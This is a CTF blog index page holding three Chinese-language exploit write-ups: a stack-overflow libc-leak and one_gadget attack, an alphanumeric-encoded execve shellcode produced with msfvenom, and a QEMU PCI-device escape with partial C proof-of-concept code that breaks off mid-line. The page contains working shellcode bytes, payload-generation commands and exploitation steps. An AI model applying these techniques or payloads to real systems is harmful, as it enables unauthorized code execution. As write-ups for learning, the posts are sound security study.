<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/6/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/6/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/BCTF%202017-100levels/">BCTF 2017-100levels</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开启了NX和PIE，不能shellcode和简单rop。之后IDA打开找漏洞，E43函数中存在栈溢出漏洞：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">--------------------------------------------------</span><br><span class="line">read(0, &amp;buf, 0x400uLL);</span><br></pre></td></tr></table></div></figure>

<p>有栈溢出那么首先想到是应该查看有没有后门，但是这个程序虽然外部引用了system函数，但是本身里并没有导入到.got.plt表中，没办法直接通过.got.plt来寻址。而且开了PIE，就算导入到.got.plt表中，也需要覆盖返回地址并且爆破倒数第四位才能跳转到system函数。虽然有栈溢出，但是没有后门函数，同样也没办法泄露Libc地址。</p>
<p>2.想getshell，又只有一个栈溢出，没有其它漏洞，还开了PIE和NX，那么一定得泄露出地址才能做，而printf地址也因为PIE没办法直接跳转。陷入卡顿，但是这里可以查看E43函数中的printf的汇编代码：</p>
<p>只能通过栈溢出形式来为下一次的printf赋参数来泄露。又由于PIE，也不知道任意一个函数的代码地址，那也没办法泄露被加载进入Libc中的内存地址。</p>
<p>3.通过调试可以看到，进入E43函数中，抵达printf函数时，栈顶的上方有大量的指向libc的地址：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532908.png" alt="img"></p>
<p>并且观察E43函数中的汇编代码，可以看到Printf是通过rbp取值的，那么我们可以通过栈溢出修改rbp来使得[rbp+var_34]落在其它地方，而如果这个其它地方有libc地址，那么就相当于泄露出了Libc地址。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532014.jpeg" alt="img"></p>
<p>4.这个关卡数是由我们设置的，而且通过递归调用E43函数，形成多个E43的栈，那么进行调试，第二次进入E43的栈之后，仍然在运行到printf函数时，栈顶上方仍旧有大量的Libc地址。由于我们需要修改rbp来使得下一次的printf打印出libc地址，那么关卡最低需要设置两关，第一关用来栈溢出，修改rbp，使得第二关中的printf函数指向栈顶上方从而打印出Libc地址。</p>
<p>5.由于栈的随机化，我们如果随意修改rbp那么就会打印出奇怪的东西，所以修改rbp的最后一个字节，使得[rbp+var_34]能够移动一定范围，以一定几率命中栈顶上方。而又由于是递归调用，第一关的栈在第二关的栈的上方，模型大致如下：</p>
<p>(1)第一次rbp和rsp以及第二次的如图：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532743.png" alt="img">  <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532872.png" alt="img"></p>
<p>(2)第一次栈以及第二次栈如图：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532846.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532270.png" alt="img"></p>
<p>▲这里用的是Libc-2.32的，用其他的Libc就不太一样，具体情况具体分析。</p>
<p>6.这里的模型是假设第一次的rsp栈顶后两位为00，但是由于栈地址随机化，所以rsp其实可以从0x00-0xFF之间变化，对应的地址也就是从0-31之间变化。</p>
<p>7.这里先考虑第一个问题，rbp-var34如何落到libc空间中，也就是当0往下移动，变化为大约是4或者5时，即可落到libc空间。同样的，从5-16变化，都可以使得rbp-var34落在libc空间。但是如果0变化成16以上，对应的第二次栈空间rbp就会变成32以上，换算成16进制为0x100，这时修改最后两位，就会变成0x15c，使得它不但不往上走，更会往下走，从而没办法落到libc空间。总而言之，慢慢研究下，然后计算概率大约为12/32=3/8，可以使得落在Libc空间。这里的5c可以改变成其它值x，但是需要x-0x34为8的倍数才行，不然取到的地址会是截断的，但是修改后成功概率会发生改变，因为0x5c扫到的地址范围大概就是libc的栈空间。</p>
<p>8.落在libc空间不代表一定就会落在指向Libc地址上，前面可以看到，在16个地址范围内大概为7个，也就是1/2的概率成功。然后由于有v2%a1这个运算，也就对应汇编代码idiv   [rbp+var_34]，这就导致如果rbp+var_34的数据为0那么就会产生除零操作，这里没办法去掉。需要进行try操作来去除这个错误，使程序重新运行，进行自动化爆破。同时泄露出来的地址会发现有时候是正数有时候是负数。这是因为我们只能泄露出地址的低32位，低8个十六进制数。而这个数的最高位可能是0或者1，转换成有符号整数就可能是正负两种情况。这里进行处理可避免成功率下降：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if addr_l8 &lt; 0:</span><br><span class="line">addr_l8 = addr_l8 + 0x100000000</span><br></pre></td></tr></table></div></figure>

<p>9.但是泄露出来的地址由于printf的参数是%d，所以打印出来的是32位地址，还需要猜剩下32位。但是这里有个技巧，貌似所有64程序加载后的代码段地址都在0x000055XXXXXXXXXX-0x000056XXXXXXXXXX之间徘徊，对应的libc加载段在0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXX范围，以下是测试数据：</p>
<p>程序开头段.load首地址和debug段首地址：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">00007F1301D2A000  </span><br><span class="line">000056238FCAB000</span><br><span class="line">差值为28EF 7207 F000</span><br><span class="line"></span><br><span class="line">00007FCB31061000</span><br><span class="line">000055D513E06000</span><br><span class="line">差值为29F6 1D25 B000</span><br><span class="line"></span><br><span class="line">00007F58EFF09000</span><br><span class="line">000055F7C1BEC000</span><br><span class="line">差值为2983 DC10 3000</span><br></pre></td></tr></table></div></figure>

<p>具体原理好像是PIE源代码随机的关系，但具体不太清楚，能用就行。所以高32位就可以假设地址为0x00007fxx，所以这里需要爆破0x1ff大小，也就是511，相当于512次，但是其实可以知道，大概率是落在0x7f里，看数据分析也可以知道，所以实际爆破次数基本在500次以内。所以将泄露出来的地址加上一个在0x7f里的值，也就是addr = addr_l8 + 0x7f8b00000000，之后再根据Libc空间中指向libc地址的后两位来区分地址：并减去在libc中查到的偏移量即可得到Libc基地址。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if hex(addr)[-2:] == &#x27;0b&#x27;: #__IO_file_overflow+EB</span><br><span class="line">libc_base = addr - 0x7c90b</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;d2&#x27;: #puts+1B2</span><br><span class="line">libc_base = addr - 0x70ad2</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-3:] == &#x27;600&#x27;:#_IO_2_1_stdout_</span><br><span class="line">libc_base = addr - 0x3c2600</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-3:] == &#x27;400&#x27;:#_IO_file_jumps</span><br><span class="line">libc_base = addr - 0x3be400</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;83&#x27;: #_IO_2_1_stdout_+83</span><br><span class="line">libc_base = addr - 0x3c2683</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;32&#x27;: #_IO_do_write+C2</span><br><span class="line">libc_base = addr - 0x7c370 - 0xc2</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;e7&#x27;: #_IO_do_write+37</span><br><span class="line">libc_base = addr - 0x7c370 - 0x37</span><br></pre></td></tr></table></div></figure>

<p>所以算上命中概率，其实调试的时候可以看到，第一关的栈空间中由于程序运行结果也会有几个指向Libc地址，加上这几个也可以提高成功率，因为修改的rbp也是有可能落在第一关的栈空间。总的爆破次数应该就是500/((1/2)*(3/8))，约为2500次，还能接受。</p>
<p>10.泄露出Libc地址之后一般就有两种方法，一种是利用栈溢出，调用万能gadget用system函数进行binsh字符串赋值，从而getshell。还有一种就是，利用one_gadget来getshell，通过查看E43返回时的汇编代码有一个move eax,0；满足libc-2.23.so的其中一个one_gadget的条件，那么直接用就行。</p>
<p>11.最后libc基地址加上one_gadget的偏移地址就可以得到one_gadget的实际地址。</p>
<p>one_gadget = libc_base + 0x45526</p>
<p>之后在第二关中再次进行栈溢出覆盖rip来跳转到one_gadget即可getshell。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/BSides%20San%20Francisco%20CTF%202017-b_64_b_tuff/">BSides San Francisco CTF 2017-b_64_b_tuff</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec下，只开了NX，之后IDA打开文件之后，有如下语句：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">s = (char *)base64_encode((int)buf, v7, v5);</span><br><span class="line">((void (*)(void))v5)();</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555015.jpeg" alt="img"></p>
<p>这里v7是输入的Buf，v5是mmap分配的内存空间。之后的语句：代表了将v5对应的内存空间强制转化为函数指针并且调用，在汇编代码中也可以看出来：这里的[ebp+var_18]就是我们输入的buf经过编码base64编码后存放的地方。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">text:0804879C var_18          = dword ptr -18h</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555021.jpeg" alt="img"></p>
<p>3.所以我们输入的内容就成了会被执行的汇编代码，也就是可以输入Shellcode，来执行我们需要的命令。这里可以看一个连接网址，从里面找shellcode：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >http://shell-storm.org/shellcode/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找，这里直接给出一个可用的shellcode:</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555344.jpeg" alt="img"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><br></pre></td></tr></table></div></figure>

<p>4.但是有Base64_encode，所以我们输入的需要会被base64编码，而base64编码只能由只由0-9，a-z，A-Z，+，/这些字符组成，(这里就是对应的ascii转换表中内容)所以常规的shellcode就不合格，我们这里选中的shellcode中某些字符就没办法被base64编码，所以这里需要用到msfvenom来选择一个可用的编码器，将我们常规的shellcode编码成可以被base64编码的shellcode。</p>
<p>5.打开Linux，输入msfvenom -l encoders可以查看编码器，后面有介绍，可以看一下，从中选择一个可用的编码器对shellcode进行编码即可。</p>
<p>6.查到x86/alpha_mixed这个编码器可以将我们输入的shellcode编码成大小写混合的代码，符合条件。</p>
<p>x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder</p>
<p>运行编码器的代码如下：</p>
<p>python -c ‘import sys; sys.stdout.write(“\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80”)’ | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 –platform linux BufferRegister=EAX -o payload</p>
<p>7.输入这段代码运行之后可以看到当前文件夹目录下生成了一个payload文件，文本打开就可以看到编码后的shellcode:</p>
<p>PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA</p>
<p>8.之后需要将这段可以被Base64编码的进行Base64解码，得到的shellcode再被程序中的Base64编码后才是我们真正起作用的shellcode。利用python脚本即可。</p>
<p>▲</p>
<p>1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。</p>
<p>2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。</p>
<p>3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。</p>
<p>4.由于在b-64-b-tuff中是通过指令call eax调用shellcode的eax,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。这段shellcode代码就可以被base64编码成我们需要的汇编代码。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/BlizzardCTF2017-Strng/">BlizzardCTF2017-Strng</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.打开虚拟环境，然后都说flag在/root/flag，给的也不是vmlinux，那么就应该是qemu逃逸。</p>
<p>2.由于只有文件，大佬们都直接告诉用户名密码，也没说怎么找，那就当作本来题目给了用户名和密码。用户名是ubuntu，密码是passw0rd。</p>
<p>3.将qemu-system-x86_64拖到IDA中开始分析，会分析很长一段时间，先看看启动参数，launch.sh：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></div></figure>

<p>没啥好注意的，显示加载了设备strng，那么这应该就是需要分析的PCI设备。然后最后一行netdev user,id=net0,hostfwd=tcp::5555-:22，把22端口重定向到了宿主机的5555端口，所以使用ssh <span class="exturl"><a class="exturl__link"   href="mailto:&#117;&#98;&#x75;&#x6e;&#x74;&#x75;&#x40;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;" >&#117;&#98;&#x75;&#x6e;&#x74;&#x75;&#x40;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> -p 5555进去。同时这里注意加载内存要1G，为了防止崩溃，我改成了128M。</p>
<p>4.然后进入qemu中看看设备信息，好找到mmio和pmio的地址：</p>
<p>(1)首先输入lspci，可以看到有一个Unclassified device</p>
<p>00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</p>
<p>这个就应该是strng设备了。</p>
<p>(2)加载IDA完成之后验证一下，函数栏搜索strng，查看相关函数。先查看设备初始化函数：strng_class_init。(这里需要将变量k的类型设置为PCIDeviceClass*)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg" alt="img"></p>
<p>可以看到加载了strng设备，然后设备号device_id是0x11e9，vendor_id是0x1234，对应在qemu中查看一下刚才猜测的strng设备，输入：lspci -v -s 00:03.0</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg" alt="img"></p>
<p>可以看到猜测没错。同时可以看到对应的mmio地址为0xfebf1000，大小256。pmio的地址为0xc050，大小8。</p>
<p>▲有时候这些命令可能不好使，判断完设备号之后，可以输入：</p>
<p>hexdump /sys/devices/pci0000:00/0000:00:03.0/config来查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg" alt="img"></p>
<p>5.之后从read和write函数中找漏洞：</p>
<p>这里将第一个参数opaque修改下类型为：struct STRNGState<em>，至于为什么是这个，打开read和write的汇编代码，很明显发现有STRNGState</em>，然后再跳转到结构体界面中找，虽然不太好找。找到之后双击，可以显示出结构体的所有成员，发现就是需要的那个：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg" alt="img"></p>
<p>(1)先看strng_mmio_read函数，读入addr并按二进制将其右移两位，相当于除以4，之后将结果作为regs数组的索引，返回该regs[add&gt;&gt;2]的值。同时还需要注意的是addr的低两位只能为0，否则过不了if ( size == 4 &amp;&amp; !(addr &amp; 3) )的检查。</p>
<p>(2)再看strng_mmio_write函数：</p>
<p>当size等于4时，将addr右移两位得到寄存器的索引idx，并提供4个功能：</p>
<p>①当idx为0时，调用srand函数但并不给赋值给内存。当i为1时，调用rand得到随机数并赋值给regs[1]。</p>
<p>②当idx为3时，调用rand_r函数，使用regs[2]的地址作为参数，最后将返回值赋值regs[3]，但后续仍然会将val值覆盖到regs[3]中，就是迷惑用的，实际功能也就是将传入的value赋值给regs[3]。</p>
<p>▲但是这里的传regs[2]的地址也是一个关键，如果我们能将rand_r函数劫持为system函数，然后在regs[2]中放入”cat /root/flag”字符串，那不就可以调用system(“cat /root/flag”)从而读取flag了吗。</p>
<p>其余则直接将传入的value赋值给regs[idx]。</p>
<p>那么通过控制addr，进而控制idx&gt;=2，就可以逐次将4个字节数据写入到regs[idx]上。</p>
<p>▲按理说如果将idx超出regs数组范围，64之后，那么不就可以任意越界写了吗，但是这里不行，因为传入的addr是不能大于mmio的大小，pci设备内部会进行检查，而刚好regs的大小为256，所以无法通过mmio进行越界读写。</p>
<p>(3)接着看strng_pmio_read函数：当传入的端口地址addr为0时，直接返回opaque-&gt;addr，否则将opaque-&gt;addr右移两位作为索引idx，返回regs[idx]的值。这个opaque-&gt;addr在strng_pmio_write中被赋值。</p>
<p>(4)然后再看strng_pmio_write函数：</p>
<p>当size等于4时，以传入的端口地址为判断提供4个功能：</p>
<p>①当传入的端口地址addr为0时，直接将传入的value赋值给opaque-&gt;addr。</p>
<p>②当传入的端口地址addr不为0时，将opaque-&gt;addr右移两位得到索引idx，分为三个功能：</p>
<p>A.idx为0时，执行srand，返回值不存储。</p>
<p>B.idx为1时，执行rand并将返回结果存储到regs[1]中。</p>
<p>C.idx为3时，调用rand_r并将regs[2]的地址作为第一个参数，返回值存储到regs[3]中。<br>否则直接将value存储到regs[idx]中。</p>
<p>▲这里就可以调用strng_pmio_write函数，形成任意地址写漏洞。</p>
<p>A.通过将addr设置为0，然后使得传入的value直接赋值给opaque-&gt;addr，使得opaque-&gt;addr形成的索引idx大于64，将reg[idx]越界指向rand_r函数指针。</p>
<p>B.然后再次调用strng_pmio_write函数，传入不为0的addr。通过opaque-&gt;addr形成的索引idx，使得regs[idx]指向rand_r函数指针，将value越界写入rand_r，劫持rand_r函数。</p>
<p>6.那么总的利用过程就清楚了：</p>
<p>(1)通过strng_mmio_write函数，将regs[2]赋值为”cat /root/flag”。</p>
<p>(2)通过strng_pmio_write函数，将rand_r函数劫持为system函数。</p>
<p>之后再调用strng_mmio_write函数，使得idx为3，然后将regs[2]的地址作为参数，调用rand_r函数，从而调用system(“cat /root/flag”)获取flag。</p>
<p>7.但是现在还需要system函数的地址，通过上面分析，可以发现有一个越界读漏洞：</p>
<p>(1)通过strng_pmio_write函数设置opaque-&gt;addr，使得opaque-&gt;addr形成的索引idx大于64，进而使得regs[idx]指向srand函数。</p>
<p>(2)通过strng_pmio_read函数，借助修改后的opaque-&gt;addr，读取idx索引regs[idx]指向的内容，也就是srand函数指针中的内容，对应的就是srand函数地址。</p>
<p>(这里大多数的exp都是针对srandom函数来泄露libc的，但rand或者rand_r应该也都可以)</p>
<p>8.那么现在总的利用过程就是泄露libc地址，然后改写rand_r函数为system函数，将”cat /root/flag”写入到regs[2]，之后通过rand_r(regs[2])来调用system(“cat /root/flag”)从而获得flag。</p>
<p>9.开始编写poc：</p>
<p>(1)写好访问pmio和mmio空间的调用函数，及前置参数：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">unsigned char* mmio_mem;</span><br><span class="line">uint32_t pmio_base=0xc050;</span><br><span class="line"></span><br><span class="line">void die(const char* msg)</span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;//用来打印错误信息，退出用的，不写也没关系</span><br><span class="line"></span><br><span class="line">void mmio_write(uint32_t addr, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    *((uint32_t*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t mmio_read(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return *((uint32_t*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t pmio_write(uint32_t addr, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint32_t pmio_read(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return (uint32_t)inl(addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>(2)打开resource0文件，利用mmap将mmio空间映射出来：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// Open and map I/O memory for the strng device</span><br><span class="line">int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);</span><br><span class="line">if (mmio_fd == -1)</span><br><span class="line">    die(&quot;mmio_fd open failed&quot;);</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap(0, 0x1000, PROT_READ | 